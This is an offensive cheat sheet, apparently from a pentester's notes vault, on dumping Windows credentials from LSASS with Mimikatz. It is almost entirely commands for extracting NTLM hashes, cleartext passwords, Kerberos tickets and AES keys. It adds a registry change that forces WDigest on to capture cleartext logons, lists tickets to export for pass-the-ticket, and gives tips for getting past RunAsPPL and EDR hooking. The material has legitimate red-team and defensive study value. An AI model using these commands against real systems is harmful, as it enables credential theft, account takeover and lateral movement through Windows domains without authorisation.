---
aliases:
  - mimikatz sekurlsa
  - logonpasswords
  - LSASS in-memory
tags:
  - type/cheatsheet
  - technique/credential-access
  - env/windows
  - asset/active-directory
  - cred/ntlm
  - cred/kerberos
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[LSASS Dumping]]"
---
# LSASS Dumping - Mimikatz Methods

***

## Pre-Requirements

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # privilege::debug` | Habilita SeDebugPrivilege | Pre-everything. |
| `mimikatz # token::elevate` | Elevate token a SYSTEM | Si admin pero no SYSTEM. |
| `whoami /priv` | Verify privileges | Pre-check. |
| `tasklist /FI "IMAGENAME eq lsass.exe"` | Get LSASS PID | Pre-dump. |
^lsass-mimi-prereq

**Required priv:** `SeDebugPrivilege` (default Local Administrators). Sin esto = `ERROR mimikatz_doLocal ; "logonpasswords" command of "sekurlsa" module not found`.

___

## sekurlsa::logonpasswords

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # sekurlsa::logonpasswords` | Hashes NTLM + cleartext (si WDigest) + Kerberos keys | Standard dump. |
| `mimikatz # sekurlsa::logonpasswords full` | Verbose all sessions | Detail. |
| `mimikatz # sekurlsa::logonpasswords /patch` | Apply patches first (legacy WDigest) | Old systems. |
^lsass-mimi-logonpasswords

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords > creds.txt

:: Output incluye:
:: - msv (NTLM hashes)
:: - tspkg (cleartext si WDigest enabled, default Win <= 8.1)
:: - wdigest (cleartext legacy)
:: - kerberos (TGT/TGS + AES keys)
:: - ssp (security support providers)
:: - credman (Credential Manager)
```

___

## sekurlsa::msv (NTLM only)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # sekurlsa::msv` | Solo NTLM hashes (less noisy output) | Targeted hash dump. |
| `mimikatz # sekurlsa::msv /username:<user>` | Single user filter | Stealth. |
^lsass-mimi-msv

___

## sekurlsa::tickets (Kerberos)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # sekurlsa::tickets` | List Kerberos tickets cached | View only. |
| `mimikatz # sekurlsa::tickets /export` | Export tickets a `.kirbi` files | Pre-PtT. |
| `mimikatz # sekurlsa::tickets /export /user:<user>` | Filter por user | Targeted. |
^lsass-mimi-tickets

```cmd
:: Export tickets para PtT
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

:: Output: <user>@<service>-<domain>.kirbi files
:: Use: mimikatz # kerberos::ptt <ticket>.kirbi
```

___

## sekurlsa::ekeys (AES Keys)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # sekurlsa::ekeys` | AES128/AES256 Kerberos keys | Modern auth (Overpass + Silver/Golden Ticket). |
^lsass-mimi-ekeys

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys

:: Output:
:: rc4_hmac_nt    : <NTLM-hash>
:: aes128_hmac    : <AES128-key>
:: aes256_hmac    : <AES256-key>
```

**Por qué útil:** AES keys necesarias para Overpass-the-Hash modern (Rubeus `/aes256`). RC4 hash sigue siendo NTLM. AES separado.

___

## sekurlsa::credman (Credential Manager)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # sekurlsa::credman` | Saved credentials (RDP, SMB, web) | Bonus creds. |
^lsass-mimi-credman

___

## sekurlsa::wdigest (Legacy Cleartext)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # sekurlsa::wdigest` | WDigest cleartext passwords | Legacy / forced enable. |
^lsass-mimi-wdigest

**Default Win 8.1+ / Server 2012R2+:** WDigest disabled (no cleartext en LSASS). Atacante puede force enable:

```cmd
:: Force WDigest enable (requires admin + reboot or Logoff/Logon)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f

:: Wait for next user logon → cleartext en LSASS
:: Dump:
mimikatz # sekurlsa::wdigest

:: Cleanup
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0 /f
```

___

## lsadump::sam (Local SAM)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # lsadump::sam` | Local SAM hashes (no LSASS, registry-based) | Local accounts. |
| `mimikatz # lsadump::secrets` | LSA Secrets (service accounts cached, DPAPI master keys) | Bonus. |
| `mimikatz # lsadump::cache` | Cached domain credentials (mscash) | Offline crack. |
^lsass-mimi-lsadump

___

## Process Memory Read

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # sekurlsa::minidump <lsass.dmp>` | Load offline dump file | Post-procdump. |
| `mimikatz # sekurlsa::logonpasswords` (post-minidump) | Parse offline dump | Standard offline. |
^lsass-mimi-minidump

```cmd
:: Workflow offline parse
mimikatz # sekurlsa::minidump C:\temp\lsass.dmp
mimikatz # sekurlsa::logonpasswords full
```

___

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list` | Sin priv | `privilege::debug` first. |
| `Privilege '20' not held` | No SeDebugPrivilege | Run elevated. |
| `[ERROR] kuhl_m_sekurlsa_acquireLSA` | LSASS Protected (RunAsPPL) | Bypass via driver (mimidrv) o Credential Guard env. |
| `Authentication ID is null` | LSASS handle failed (EDR hooking?) | Try alt method (procdump → offline). |
| Output sin entries | RunAsPPL active o Credential Guard | Modern protection. |
^lsass-mimi-errors

***
